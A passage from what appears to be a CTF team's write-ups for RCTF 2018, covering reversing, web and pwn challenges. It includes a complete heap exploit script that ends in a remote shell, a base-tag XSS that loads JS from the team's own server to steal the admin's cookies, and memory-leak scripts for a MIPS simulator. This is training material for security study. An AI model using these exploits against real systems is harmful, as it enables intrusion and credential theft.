log(logging.INFO, msg) logw = lambda msg: log(logging.WARNING, msg) loge = lambda msg: log(logging.ERROR, msg) class SQLvm: def __init__(self, mem): self.regs = {} self.flag = [\u0026#39;\u0026#39;] * 200 self.regs[\u0026#39;pc\u0026#39;] = 0 self.mem = mem def step(self): code = self.mem[self.regs[\u0026#39;pc\u0026#39;]] self.regs[\u0026#39;pc\u0026#39;] += 1 if code[0] == \u0026#39;Goto\u0026#39;: self.regs[\u0026#39;pc\u0026#39;] = int(code[2]) elif code[0] == \u0026#39;OpenRead\u0026#39;: logw(\u0026#39;OpenRead\u0026#39;) self.cursor = [] elif code[0] == \u0026#39;String8\u0026#39;: self.regs[int(code[2])] = code[4] logw(\u0026#39;{} = {}\u0026#39;.format(code[2], code[4])) elif code[0] == \u0026#39;Integer\u0026#39;: self.regs[int(code[2])] = int(code[1]) elif code[0] == \u0026#39;Column\u0026#39;: logw(code) self.flag[int(code[3])] = \u0026#39;\u0026#39; self.regs[int(code[3])] = int(code[3]) elif code[0] == \u0026#39;Function\u0026#39;: # s = self.regs[int(code[2])] # x = self.regs[int(code[2]) + 1] # y = self.regs[int(code[2]) + 2] self.regs[int(code[3])] = self.regs[int(code[2]) + 1] pass elif code[0] == \u0026#39;Ne\u0026#39;: logw(code) logw(\u0026#39;\u0026#39;.join(self.flag)) self.flag[self.regs[int(code[3])]] = self.regs[int(code[1])] self.regs[int(code[3])] = self.regs[int(code[1])] if self.regs[int(code[3])] != self.regs[int(code[1])]: self.regs[\u0026#39;pc\u0026#39;] = int(code[1]) elif code[0] == \u0026#39;Halt\u0026#39;: logw(\u0026#39;Halted\u0026#39;) return True else: loge(code) # put the log file there code = \u0026#39;\u0026#39;\u0026#39;0|Trace|0|0|0||00| 1|Goto|0|93|0||00| .... 165|Goto|0|2|0||00|\u0026#39;\u0026#39;\u0026#39; compcode = [] for line in code.splitlines(): compcode.append(line.split(\u0026#39;|\u0026#39;)[1:]) vm = SQLvm(compcode) # step until halt while not vm.step(): pass for k in vm.regs: if type(vm.regs[k]) == type(\u0026#39;\u0026#39;): print(k, vm.regs[k]) print(\u0026#39;\u0026#39;.join(vm.flag)) \u0026#39;flag{lqs_rof_galf_esreve_a}\u0026#39; Note # Since we made some approximations or mistakes, the output is not correct, but it is easy to guess the right flag flag{lqs_rof_galf_esrever_a}\nbabyre2 # Attachment\nOverview # Reverse challenge\nWe are given a binary with xmm instructions\nIt takes a string as input and then multiplies it with some constants on the stack takes the remainder mod 0xFFFFFFFFFFFFFFC5 (which is prime) and saves the results on the stack\nfunction at 0x400BA0 takes three arguments (flag[i] * multipl[i], modulus, 0)\nwhen the third argument is 0 is computes (flag[i] * multipl[i]) % modulus from 0x40098F on in the main it xors the results with some global variable and checks if the every xor is 0\nif we pass the check it prints \u0026ldquo;Correct. Congratulations!\u0026rdquo;\nSolution # Since every step is invertible we just reverse the algorithm and get the flag with the formula:\nflag[i] = ((int64*) xmm)[i] * multipl[i]^-1 Now copy the constants from the binary and we are done\nScript (sagemath) # import binascii from Crypto.Util.number import long_to_bytes from Crypto.Util.strxor import strxor for _ in xrange(8): pieces.append(0xffffffffffffffff) multipl = [0] * 16 multipl[0] = 2334392307038315863L; multipl[1] = 2325638905700839284L; multipl[2] = 7298118523202646066L; multipl[3] = 2333181762011686258L; multipl[4] = 7142785229535732034L; multipl[5] = 7306930302321713512L; multipl[6] = 8462115405118268960L; multipl[7] = 0xffffffffffff002e; multipl[8] = 2^64 - 1; multipl[9] = 2^64 - 1; multipl[10] = 2^64 - 1; multipl[11] = 2^64 - 1; multipl[12] = 2^64 - 1; multipl[13] = 2^64 - 1; multipl[14] = 2^64 - 1; multipl[15] = 2^64 - 1; # multipl[7] = 46; length = len(multipl) mod_value = 0xffffffffffffffc5 xmm_values = [] xmm_values.extend([0x7BA58F82BD898035,0x2B7192452905E8FB][::-1]) xmm_values.extend([0x163F756FCC221AB0,0xA3112746582E1434][::-1]) xmm_values.extend([0xDCDD8B49EA5D7E14,0xECC78E6FB9CBA1FE][::-1]) xmm_values.extend([0xAAAAAAAAAA975D1C,0xA2845FE0B3096F8E][::-1]) xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1]) xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1]) xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1]) xmm_values.extend([0x55555555555559A3,0x55555555555559A3][::-1]) flag = [0] * length for i in xrange(length): flag[i] = long_to_bytes(int(int((xmm_values[i]) * int(pow(multipl[i], - 1, mod_value))) % mod_value))[::-1] print(\u0026#39;\u0026#39;.join(flag)) flag{stay_prime_stay_invertible_away_from_bruteforce}UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU Cats # Overview # We have a webform that let\u0026rsquo;s us submit a list of cat food and a list of cat names.\nIt saves the cat food list to a file named food and then for each cat name, it runs the command\ndocker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c \u0026quot;timeout 5 diff -Z \u0026lt;(cat food) \u0026lt;(eachCatNameYouProvided food)\nWe can download the dockerfile of the challenge environment, so we build the container and look for what commands we can use.\nWe list the binaries for each location in the $PATH variable\necho $PATH -\u0026gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin and we get this list https://pastebin.com/WRkbFmmw\nSolution # We noticed that there are a lot of sh-like commands (many are just symlinks):\nsh,dash,rbash,bash\nIf we put cat food as food we will get 4 cat names at the cost of 1.\nThen we looked for other cat-like programs, since choosing cat food as food limits our possibilities to use other interpreters.\nWe found at first tail,head,sort,tac,uniq which are identical to cat in this case\nThen we found some exotic commands like zmore,more,splain,expand,unexpand,fold\nSo in the end we submitted cat food\nsh,dash,rbash,bash,zmore,more,splain,expand,unexpand,fold,tail,head,sort,tac,uniq\nAnd got\nWew, you\u0026#39;ve found 15 cats! Here is your flag: RCTF{you_love_cats_dont_you}. If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._. Time for another challenge ._.\nNotes # You\u0026rsquo;ll spend a lot of time fighting re-captcha\nCats Rev. 2 # Overview # If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.\nSame as Cats, but this time we need to make the file an executable polyglot to make it work with those commands.\nOur objective is to make the file read itself.\nSolution # We need to choose 4 of the 5 commands to work with. PHP is easy, since if the file does not contain any PHP code the command will just print out the contents of the file. One done.\nLet\u0026rsquo;s work with Python. A useful feature in Python is the multiline comment: using three single quotes lets us comment many lines of code in Python, while at the same time leaves these lines valid for other languages. For example in Ruby and Bash four quotes are equivalent to two concatenated empty strings and are perfectly valid.\nWe can make some space for ruby and bash code in the comment, while calling the system function to make Python read the file itself.\na = \u0026#39;\u0026#39;\u0026#39;\u0026#39; # bash and ruby code here \u0026#39; \u0026#39;\u0026#39;\u0026#39; import os; os.system(\u0026#39;cat food\u0026#39;) We now want to write some code that is valid for both Bash and Ruby.\nThe \u0026lsquo;!\u0026rsquo; operator in Bash evaluates a command and inverts the exit code, while in Ruby it\u0026rsquo;s a normal \u0026ldquo;is false\u0026rdquo; operator. We can use this to make an if to distinguish the two cases, then make the script exit immediately after reading the file to avoid syntax errors.\nFinal version:\na=\u0026#39;\u0026#39;\u0026#39;\u0026#39; test=true if ! test ; then cat food; exit 0 fi end exec(\u0026#39;cat food\u0026#39;) \u0026#39; \u0026#39;\u0026#39;\u0026#39; import os; os.system(\u0026#39;cat food\u0026#39;) Working cats:\ntail,head,dash,sh,zmore,more,splain,uniq,expand,rbash,fold,python3,ruby,php,bash No-js # Overview # We\u0026rsquo;re greeted with a password prompt. Our objective is to find the correct password.\nThe page is written in React, let\u0026rsquo;s look at the source code and try to understand how the password is checked.\nThe source code is sadly minified, all functions and variables are one or two letter long. This made reversing the code quite harder.\nWe anyhow understand that the password is like RCTF{XXX_XXX_XXX_XXX_XXX_XXX_XXX}. The password is split over the underscores, then the 7 individual pieces are checked separatedly with different expressions.\nFor reference, we\u0026rsquo;re talking about the section of code that starts like\nvar sg = new Y(null, 7, 5, Z, [function (a) { return K.f(a, \u0026#34;no\u0026#34;) }, function (a) { return K.f(0, Kd(new Y(null, 10, 5, Z, [45, 36, 57, 36, 54, 38, 53, 1, 51, 55], null), li(a))) }, function (a) { return K.f(mi(a), \u0026#34;0SWCRMLH\u0026#34;) }, function (a) { return K.f(mi(a), \u0026#34;000EQTPI\u0026#34;) }, Bk, function (a) { [...] Let\u0026rsquo;s walk over them one by one.\nWord 1 # The function K.f is just an equality check. The first word is therefore no.\nWord 2 # Y is just a wrapper for the object passed as fifth argument. The check basically forces li(word) to be equal to [45, 36, 57, 36, 54, 38, 53, 1, 51, 55]. Looking at the function li we can see that it works char by char, and is thus easily bruteforced and inverted.\nThe second word is javascr1pt.\nWords 3 and 4 # The third and fourth checks both use the function mi.\nThere\u0026rsquo;s a lot of boilerplate, but after some reversing we can see that:\nThe function mi takes a string and splits it in blocks of 5 chars. For each block a 8-chars long string is built. The new string is made by computing combinations of bits of the 5 input byes and using those as index on \u0026ldquo;765432ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026rdquo;. The string is finally padded with \u0026lsquo;0\u0026rsquo;s. This function is also easily invertible. We find the original bytes for \u0026ldquo;0SWCRMLH\u0026rdquo; and \u0026ldquo;000EQTPI\u0026rdquo; and we get two new words, lets and use.\nWord 5 # The fifth check is a call to the function Bk. Bk makes an eval on a string, which we find out is equivalent to an equality between two BigInts, one fixed and one derived from our input. The latter is returned from Ak(a).\nAk contains lots of complex operations, but by looking up on google some of the numbers used, we find out they are md5 constants. Ak is most probably an md5 digest.\nThe check passes if Bk returns 270350715534787783724753109733385149467, which in hex is 0xcb63a762f1571806222efef7ec7f9c1b, i.e. the md5 hash of \u0026lsquo;50me\u0026rsquo;. We test it and the check passes.\nThe fifth word is 50me.\nWord 6 # This check is a maze of callbacks and was awful to reverse.\nTo begin we can see that the value returned by calling an inline function on our input must be equal to [21104, 50328, 78128, 119488, 411168, 592832].\nSince the function is a little too complex we decided to do some black-box analysis. With some tests we can see that the array which is returned contains a number for every 2 chars contained in the input. Even better, every 2 chars correspond to a single value, that is then multiplied by 2^(index) in the array itself.\nSince the check is computed 2 chars at a time, this is again bruteforceable. The sixth word is funcccTional.\nWord 7 # This check is another maze of callbacks, so we decided to make some top-level assumptions to simplify the analysis.\nThere\u0026rsquo;re a lot of \u0026ldquo;type conversions\u0026rdquo;, that don\u0026rsquo;t change the inner value of a variable, we consider them js primitives to determine the logic There\u0026rsquo;s an abuse of the Re function, we assume all parameters except the first one are arrays of ints (verified with Chrome Dev Tools in some cases) Using a top-down approach:\nK.f checks that the output of window.btoa is equals to a given base64 encoded string fi(a, b) turns out to be b.join(a) The next couple of Re() convert an array of int into an array of chars The next 3 callbacks are ensuring we are passing one char at a time, and doing some weird type conversions that we ignored. The only important part is knowing that our input is passed through li(). Once we arrive at function (a, c, d, e) {, we see a static argument calculated as: xe(hd, xe(hd, be(22, 33), li(\u0026quot;okotta\u0026quot;)), new Y(null, 3, 5, Z, [11, 45, 14], null)). We evaluated it using Chrome Dev Tools, it looks like a linked-list of the following numbers: 14 45 11 36 55 55 50 46 50 22 33 We move inside function (a, c) {, ignoring all the other wrappers/type convertions if (Cd(a)) { is always false, ignore body g = N(a); fetchs the first element of a (input array) ed(c + g, w(Hc(a))) calculated the sum of c + g, Hc(a) removes the first element of a At a top level, the scripts does:\nSplit the input in an array of int (using chartCode) Passing the array through li() Doing a sum of every element of the array, with every element of our static linked-list (14 45 11 36 55 55 50 46 50 22 33) Concatenating the results into a string Base64 encoding the string Matching the string with the given one At this point, we can reverse the algorithm with a quick python script:\n##!/usr/bin/env python2 import base64 target = [ord(x) for x in base64.b64decode(\u0026#34;PVw6U2ZmYV1hRVAyUS9IW1tWUlY6RTJRL0hbW1ZSVjpFMlEvSFtbVlJWOkUyUS9IW1tWUlY6RT9ePFVoaGNfY0dSP148VWhoY19jR1IePRs0R0dCPkImMUZlQ1xvb2pmak5ZMlEvSFtbVlJWOkU4VzVOYWFcWFxASzZVM0xfX1pWWj5JNlUzTF9fWlZaPkk2VTNMX19aVlo+STZVM0xfX1pWWj5JDy4MJTg4My8zFyI=\u0026#34;)] sub = [14, 45, 11, 36, 55, 55, 50, 46, 50, 22, 33] reversePartOne = [] i = 0 while i \u0026lt; len(target): reversePartOne.append(target[i] - sub[0]) i = i+11 def li(a): if 57 \u0026gt;= a: return a - 48 else: if 90 \u0026gt;= a: return a - 65 + 10 else: if 122 \u0026gt;= a: return a - 97 + 36 else: return None inv = {} for a in range(0, 256): inv[li(a)] = a print \u0026#39;\u0026#39;.join(chr(inv[x]) for x in reversePartOne) The last word is: laaaannGuageeee1\nSolution # Final solution: RCTF{no_javascr1pt_lets_use_50me_funcccTional_laaaannGuageeee1}\nbabyheap # Overview # We\u0026rsquo;re given a 64-bit Linux ELF and its libc (2.23). Checksec shows full RELRO, canaries, NX and PIE.\nDuring initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset. Then, the program shows a basic menu:\n1. Alloc 2. Show 3. Delete 4. Exit We can allocate up to 32 heap chunks with size up to 256. They are calloced and then populated with user input. The show option prints the content (as a string), and the delete option frees the chunk.\nVulnerability # There is an off-by-one vulnerability in the function at 0xBC8, which reads user input. If the user input has the exact same size as the destination buffer, a NUL terminator will overflow the buffer.\nExploitation # Exploitation is straightforward. We abused the NUL byte overflow via a free chunk shrinking attack. Specifically, we get overlaps for two chunks:\nAn allocated smallchunk, for leaking libc; A freed 0x70 fastchunk, for a fastbin attack. To leak libc, we can allocate a smallchunk (let\u0026rsquo;s call it unsorted) that overlaps the previously allocated smallchunk (let\u0026rsquo;s call it leak). Then, we free unsorted and use the show option on leak to get the fd pointer of unsorted. Since it is in the unsorted bin, its fd will point within main_arena in libc.\nNow that we have libc, our goal is to link a fake fastchunk near __malloc_hook. Due to the presence of NULL pointers and valid libc pointers (0x7f top byte) before the hook, the qword at \u0026amp;__malloc_hook-27 is exactly 0x7f. Since fastchunk sizes don\u0026rsquo;t have to be aligned, this is a valid fastchunk header. We allocate a chunk that overlaps the freed 0x70 fastchunk from earlier, and we reconstruct it (it was zeroed by calloc) with an fd pointing to \u0026amp;__malloc_hook-27-8 (prev_size is included). Now the fake fastchunk near the hook is linked in the 0x70 fastbin. We allocate a 0x70 fastchunk to bring the fake one to the fastbin head, and finally allocate the fake fastchunk. Now we simply overwrite __malloc_hook with a suitable onegadget (0x4526a in libc works), and obtain a shell on the next allocation.\nExploit code # #!/usr/bin/env python2 from pwn import * p = remote(\u0026#39;babyheap.2018.teamrois.cn\u0026#39;, 3154) chunks = [False]*32 def menu(n): p.recvuntil(\u0026#39;choice: \u0026#39;) p.sendline(str(n)) def alloc(size, content=\u0026#39;\u0026#39;, final=False): menu(1) p.recvuntil(\u0026#39;size: \u0026#39;) p.sendline(str(size)) if final: return p.recvuntil(\u0026#39;content: \u0026#39;) p.send(content + (\u0026#39;\\n\u0026#39; if len(content) \u0026lt; size else \u0026#39;\u0026#39;)) idx = chunks.index(False) chunks[idx] = True return idx def show(idx): menu(2) p.recvuntil(\u0026#39;index: \u0026#39;) p.sendline(str(idx)) p.recvuntil(\u0026#39;content: \u0026#39;) content = p.recvuntil(\u0026#39;\\n1. Alloc\u0026#39;)[:-len(\u0026#39;\\n1. Alloc\u0026#39;)] return content def delete(idx): menu(3) p.recvuntil(\u0026#39;index: \u0026#39;) p.sendline(str(idx)) chunks[idx] = False prog = log.progress(\u0026#39;Setting up heap layout\u0026#39;) # layout: 0x18 (alloc) | 0x220 (free) | 0x110 (alloc) bottom = alloc(0x18) gap1 = alloc(0x100) gap2 = alloc(0x100, \u0026#39;A\u0026#39;*0xe0 + p64(0x200)) # shrunk prev_size top = alloc(0x100) alloc(0x18) delete(gap1) delete(gap2) prog.success() prog = log.progress(\u0026#39;Shrinking free chunk\u0026#39;) delete(bottom) # off-by-one NUL overflow into the 0x220 free chunk alloc(0x18, \u0026#39;A\u0026#39;*0x18) prog.success() prog = log.progress(\u0026#39;Overlapping chunks\u0026#39;) head = alloc(0x88) leak = alloc(0x88) # for unsorted leak delete(alloc(0x68)) # for fastbin attack delete(head) delete(top) prog.success() prog = log.progress(\u0026#39;Leaking libc\u0026#39;) alloc(0x88) unsorted = alloc(0x88) delete(unsorted) libc_base = u64(show(leak).ljust(8, \u0026#39;\\x00\u0026#39;)) - 0x3c4b78 prog.success(\u0026#39;@ 0x{:012x}\u0026#39;.format(libc_base)) prog = log.progress(\u0026#39;Linking fake chunk\u0026#39;) malloc_hook = libc_base + 0x3c4b10 fake_fast_addr = malloc_hook - 27 - 8 alloc(0x100, \u0026#39;A\u0026#39;*0x80 + \u0026#39;B\u0026#39;*8 + p64(0x71) + p64(fake_fast_addr)) alloc(0x68) prog.success() prog = log.progress(\u0026#39;Overwriting __malloc_hook\u0026#39;) one_gadget = libc_base + 0x4526a alloc(0x68, \u0026#39;A\u0026#39;*19 + p64(one_gadget)) prog.success() log.info(\u0026#39;Popping shell\u0026#39;) alloc(0x18, final=True) p.interactive() # $ cat flag # RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58} rBlog 2018 # Overview # We\u0026rsquo;re greeted with a simple blog platform, with the possibility to make the admin visit a post. Our objective is to steal the admin cookie.\nWe quickly found 2 potential XSS, a standard one in the title, and one in the style selector which allows to load local scripts (bypassing the CSP nonce).\nThe CSP is fairly strict, so we can\u0026rsquo;t use inline js or script tags (because of the nonce): default-src 'none'; script-src 'nonce-0672df2f3f6c548295847afc13c69f87'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'\nThe intended solution # The intended solution was to upload a image, which contained valid JS code, and to execute the uploaded file using the script inclusion in the style selector. However, most browsers block script with a audio/video/image MIMEtype, so the uploaded image had to be a WebP (which, apparently, has no MIMEtype). This is very similar to the PlaidCTF2018 challenge idIoT: Action (with a WAVE file, but the execution is the same). However, we solved it in another (probably unintended) way:\nWhat real hackers do: # By checking carefully the CSP using https://csp-evaluator.withgoogle.com/, we realized the base-uri directive was missing. This is a huge oversight: to solve the challenge, all we had to do was to put in the title \u0026lt;base href=\u0026quot;http://ourserver.com/\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;, and to set up ourserver.com to serve a malicious js file at http://npicca.ga:8000/assets/js/jquery.min.js, which will be loaded by the admin. We send the page to the admin and we get the cookies: RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}; hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d\nrBlog 2018 v2 # In the hint from the previous solution, we found the screenshot of a command line running Parcel Development Server. We run a copy of that on our server, and found out it has a feature called Hot Module Replacement. This feature includes a script in the boundle, that connects to a WebSocket server and listen for file updates.\nThe first problem is that the WebSocket port is randomized at every run of the server, unless specified in the command line (and from the screenshot it\u0026rsquo;s not the case). Luckily Parcel Development Server has really open CORS Headers. We fetched the index and app.js pages using XMLHTTPRequest and found out the WebSocket port. We also found out the site is empty, just an empty html file and a document.write troll instruction.\nWe lost most of our time trying to force the page to connect to another WebSocket server, so we could push a custom update event and inject code into the page. Unfortunatly the address is taken from location.hostname, and there\u0026rsquo;s no way to change that variable without loosing access to the cookies. As a last resource, we decided to connect to the WebSocket server and listen from incoming updates, maybe someone is updating the files with the flag. Since WebSocket doesn\u0026rsquo;t care about SOP, and we have have the address and the port, we just connected to it and sent every date we recieved to our server. We received an update with the flag as a javascript comment in app.js, nice!\n520gift # We are given a zip with 17 pics of different lipsticks, a cosmetic brand name and a hint about finding their color name first. As if that wasn\u0026rsquo;t enough, reverse searching the images leads only to Chinese sites. And after a ridiculous amount of time, we finally found the original poster on weibo, and of course we need an account to see all her posts (which, of course, we cannot register because of the mobile number), but \u0026ldquo;luckily\u0026rdquo; we found a mirror which didn\u0026rsquo;t require registration. We then proceeded to examine a countless amount of lipstick pics, trying to match them with the 17 given to us, and in the end we end up with all the lipstick names. The initial letters of the first 4 names form \u0026ldquo;rctf\u0026rdquo;, so we tried to add braces and fill with the other initials and it worked.\nNumber magic # After solving a POW, we are greeted with a message describing the game: we need to guess a sequence of k unique integers in a specified range (e.g. [0,10)) using up to a fixed number of guesses; after each guess we are given two integers as feedback (without specifying their nature). After a couple of tries, it\u0026rsquo;s pretty obvious that we are playing a variation of Mastermind (i.e. the feedback is the number of colors in the right position and the number of colors in the wrong position but present in the solution) where we cannot choose multiple colors, so we just need a solver for it. We end up writing the solver instead of using something else because it wasn\u0026rsquo;t specified whether the number of pegs k or the number of colors could change.\nCode # from pwn import * import hashlib, itertools, re, random def scoreThis(guess, truth): a = 0 for i in xrange(len(guess)): if guess[i] == truth[i]: a+=1 b = len(set(guess).intersection(set(truth))) - a return a, b def score(guess, S): worst = 0 outcome = {} for s in S: z = scoreThis(guess, s) if z not in outcome: outcome[z] = 0 outcome[z] += 1 for k,v in outcome.items(): worst = max(worst, v) return worst def play(guess): r.sendline(\u0026#34; \u0026#34;.join(map(str, guess))) z = r.recvline() print z if \u0026#34;Nope\u0026#34; in z: z = z.replace(\u0026#34;,\u0026#34;,\u0026#34;\u0026#34;).split() return int(z[1]), int(z[2]) else: return -1, -1 def solve(N, U, T): S = set(itertools.permutations(range(U), N)) it = 0 while (True): print \u0026#34;{}/{}\u0026#34;.format(it, T) print len(S) if it \u0026gt; 0: guess = [len(S)+1, None] for s in S: sc = score(s, S) if sc \u0026lt; guess[0]: guess = [sc, s] else: guess = [-1, [i for i in xrange(N)]] print guess guess = guess[1] a,b = play(guess) print a,b if a == -1: break rem = [] for s in S: if scoreThis(guess, s) != (a,b): rem.append(s) for s in rem: S.remove(s) it += 1 print list(S)[0] r = remote(\u0026#39;149.28.139.172\u0026#39;, 10002) def captcha(r): line = r.readline().strip() target = line.split(\u0026#39; \u0026#39;)[-1] suffix = line.split(\u0026#39;)\u0026#39;)[0].split(\u0026#39;+\u0026#39;)[1] print \u0026#39;[+] Captcha for\u0026#39;, target, suffix alpha = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; for a,b,c,d in itertools.product(alpha, repeat=4): if hashlib.sha256(a+b+c+d+suffix).hexdigest() == target: r.sendline(a+b+c+d) return print \u0026#39;[x] no luck with captcha\u0026#39; exit(1) captcha(r) while True: try: r.recvuntil(\u0026#34;=====\u0026#34;) except: print r.clean(0) break print r.recvline().strip() l = r.recvline().strip() print l p = re.search(\u0026#34;Give me (\\d+) numbers, in\\[0, (\\d+)\\), You can only try (\\d+) times\u0026#34;, l) N, U, T = map(lambda x: int(p.group(x)), range(1,4)) print N, U, T solve(N,U,T) r.interactive() Simulator # Attachment(original link)\nOverview # We are given a 32-bit Linux ELF executable which is a MIPS interpreter. Checksec shows canaries and NX, but only partial RELRO and no PIE. It accepts the following MIPS istructions: add, sub, slt, and, or, syscall, beq, lw, sw, li, mov, and j. We have the usual registers: zero, at, v0, v1, a0-a3, t0-t9, s0-s7, k0, k1, gp, sp, fp, and ra. Each register is stored in the BSS and the program reserves 4 bytes in order to store the content. Two memory regions are mapped in order to store instructions (starts at 0x5000000) and data (starts at 0x4000000). All the MIPS instructions we give to the program are executed by an interpreter that works on registers (in the BSS) and data (0x4000000). Moreover, the syscall instruction with v0 equal to 1 does a printf of the integer value stored in the register t0.\nVulnerability # Our idea is to bypass the checks made by the lw and sw instructions to read (with the syscall) and write in other memory regions, outside the boundaries of the data mapping. The check is:\nif (address \u0026gt; 1024) printf(\u0026#34;Memory access error\u0026#34;) Here, address is signed. Therefore, if we set the MSB the check passes. The value of the address is then multiplied by 8, summed to 0x4000004 and truncated to 32 bits. We can thus read and write 4 bytes at addresses that are congruent to 4 (mod 8). Note that the result of the multiplication is not altered by the MSB we set, because of integer overflow.\nLeaking libc\u0026rsquo;s position # This part requires a bit of math to get an arbitrary read on the GOT, where we leaked the address of strcmp and strchr. We couldn\u0026rsquo;t find the libc that was being used, so we first found the offset between strcmp and the libc base by going backwards 4K at a time until a crash (because there\u0026rsquo;s nothing between the binary and libc). To do this, we subtracted 0x4000004 from the strcmp address, divided by 8 (with an ad hoc MIPS function), set the MSB and then iterated in a cycle in which we attempt an lw, subtract 512 and repeat. This is the script:\n#!/usr/bin/env python2 from pwn import * import itertools from hashlib import sha256 def pow(todo=False): if(todo == True): conn = remote(\u0026#34;simulator.2018.teamrois.cn\u0026#34;, 3131) chall = conn.recvuntil(\u0026#34;\\n\u0026#34;).split(\u0026#34;\\n\u0026#34;)[0] alpha = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; for a,b,c,d in itertools.product(alpha, repeat=4): if(sha256(chall + a + b + c + d).digest().startswith(\u0026#39;\\0\\0\\0\u0026#39;) == True): sol = a + b + c + d break; conn.sendline(sol) return conn else: return process(\u0026#39;./simulator\u0026#39;) def div8(): lines = [] lines.append(\u0026#39;li $v0, 0\u0026#39;) lines.append(\u0026#39;li $t0, 1\u0026#39;) for i in reversed(range(3, 32)): lines.append(\u0026#39;li $t1, {}\u0026#39;.format(2**i)) lines.append(\u0026#39;slt $t2, $a0, $t1\u0026#39;) lines.append(\u0026#39;beq $t2, $t0, div8_{}\u0026#39;.format(i-1)) lines.append(\u0026#39;sub $a0, $a0, $t1\u0026#39;) lines.append(\u0026#39;li $t1, {}\u0026#39;.format(2**(i-3))) lines.append(\u0026#39;add $v0, $v0, $t1\u0026#39;) lines.append(\u0026#39;div8_{}:\u0026#39;.format(i-1)) return \u0026#39;\\n\u0026#39;.join(lines) # leak strcmp, go back 4k until crash code = \u0026#34;\u0026#34;\u0026#34; li $t0, 2155911681 lw $a0, $t0 li $v0, 1 syscall sub $a0, $a0, 67108868 \u0026#34;\u0026#34;\u0026#34; + div8() + \u0026#34;\u0026#34;\u0026#34; li $t0, 2147483648 add $a0, $v0, $t0 find_base: lw $t0, $a0 li $v0, 1 syscall sub $a0, $a0, 512 j find_base \u0026#34;\u0026#34;\u0026#34; prog = log.progress(\u0026#39;Solving PoW\u0026#39;) conn = pow(True) prog.success() prog = log.progress(\u0026#39;Sending code\u0026#39;) conn.sendline(code) conn.sendline(\u0026#39;END\u0026#39;) prog.success() prog = log.progress(\u0026#39;Leaking strcmp\u0026#39;) strcmp = int(conn.recvline()) \u0026amp; 0xffffffff prog.success(\u0026#39;0x{:08x}\u0026#39;.format(strcmp)) prog = log.progress(\u0026#39;Finding libc base\u0026#39;) try: while True: val = int(conn.recvline()) libc = ((val * 8 + 0x4000004) \u0026amp; 0xffffffff) \u0026amp; ~0xfff except (EOFError, ValueError): pass prog.success(\u0026#39;0x{:08x}\u0026#39;.format(libc)) log.info(\u0026#39;Offset = 0x{:x}\u0026#39;.format(strcmp - libc)) Dumping libc # Now that we know where the libc base is (relative to strcmp), we wrote another script to dump libc. The address calculation is very similar to the previous script. We can only read at addresses congruent to 4 (mod 8), so we\u0026rsquo;ll get a dump that alternates between 4 unknown bytes and 4 leaked bytes. This is the script:\n#!/usr/bin/env python2 from pwn import * import itertools from hashlib import sha256 def pow(todo=False): if(todo == True): conn = remote(\u0026#34;simulator.2018.teamrois.cn\u0026#34;, 3131) chall = conn.recvuntil(\u0026#34;\\n\u0026#34;).split(\u0026#34;\\n\u0026#34;)[0] alpha = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; for a,b,c,d in itertools.product(alpha, repeat=4): if(sha256(chall + a + b + c + d).digest().startswith(\u0026#39;\\0\\0\\0\u0026#39;) == True): sol = a + b + c + d break; conn.sendline(sol) return conn else: return process(\u0026#39;./simulator\u0026#39;) def div8(): lines = [] lines.append(\u0026#39;li $v0, 0\u0026#39;) lines.append(\u0026#39;li $t0, 1\u0026#39;) for i in reversed(range(3, 32)): lines.append(\u0026#39;li $t1, {}\u0026#39;.format(2**i)) lines.append(\u0026#39;slt $t2, $a0, $t1\u0026#39;) lines.append(\u0026#39;beq $t2, $t0, div8_{}\u0026#39;.format(i-1)) lines.append(\u0026#39;sub $a0, $a0, $t1\u0026#39;) lines.append(\u0026#39;li $t1, {}\u0026#39;.format(2**(i-3))) lines.append(\u0026#39;add $v0, $v0, $t1\u0026#39;) lines.append(\u0026#39;div8_{}:\u0026#39;.format(i-1)) return \u0026#39;\\n\u0026#39;.join(lines) STRCMP_LIBC_OFF = 0x13a6b0 code = \u0026#34;\u0026#34;\u0026#34; li $t0, 2155911681 lw $a0, $t0 sub $a0, $a0, {} li $v0, 1 syscall sub $a0, $a0, 67108860 \u0026#34;\u0026#34;\u0026#34;.format(STRCMP_LIBC_OFF) + div8() + \u0026#34;\u0026#34;\u0026#34; li $t0, 2147483648 add $t0, $v0, $t0 dump: lw $a0, $t0 li $v0, 1 syscall add $t0, $t0, 1 j dump \u0026#34;\u0026#34;\u0026#34; prog = log.progress(\u0026#39;Solving PoW\u0026#39;) conn = pow(True) prog.success() prog = log.progress(\u0026#39;Sending code\u0026#39;) conn.sendline(code) conn.sendline(\u0026#39;END\u0026#39;) prog.success() prog = log.progress(\u0026#39;Leaking libc\u0026#39;) libc = int(conn.recvline()) \u0026amp; 0xffffffff prog.success(\u0026#39;0x{:08x}\u0026#39;.format(libc)) prog = log.progress(\u0026#39;Dumping libc\u0026#39;) with open(\u0026#39;libc_dump\u0026#39;, \u0026#39;wb\u0026#39;) as f: try: while True: val = int(conn.recvline()) \u0026amp; 0xffffffff f.write(\u0026#39;\\x00\u0026#39;*4 + p32(val)) except (EOFError, 